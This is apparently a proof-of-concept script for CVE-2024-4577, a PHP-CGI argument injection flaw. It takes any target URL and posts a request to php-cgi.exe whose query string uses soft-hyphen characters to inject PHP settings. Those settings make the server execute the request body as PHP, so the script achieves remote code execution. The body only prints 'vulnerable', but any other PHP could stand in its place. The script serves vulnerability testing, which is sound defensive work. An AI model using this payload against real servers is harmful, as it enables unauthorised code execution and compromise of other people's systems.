# CVE-2024-4577 PHP-CGI Argument Injection Vulnerability (@Sh0ckFR)

import requests
import argparse

parser = argparse.ArgumentParser(description='Testing CVE-2024-4577 PHP-CGI Argument Injection Vulnerability.')
parser.add_argument('url', type=str, help='The URL of the target (ex: http://127.0.0.1/)')

args = parser.parse_args()
url_base = args.url.rstrip('/')

url = f"{url_base}/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
data = "<?php echo \"vulnerable\"; ?>"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

print(f"Testing {args.url}...")
response = requests.post(url, data=data, headers=headers)

if "vulnerable" in response.text:
    print(f"{args.url} is vulnerable!")
else:
    print(f"{args.url} is NOT vulnerable!")
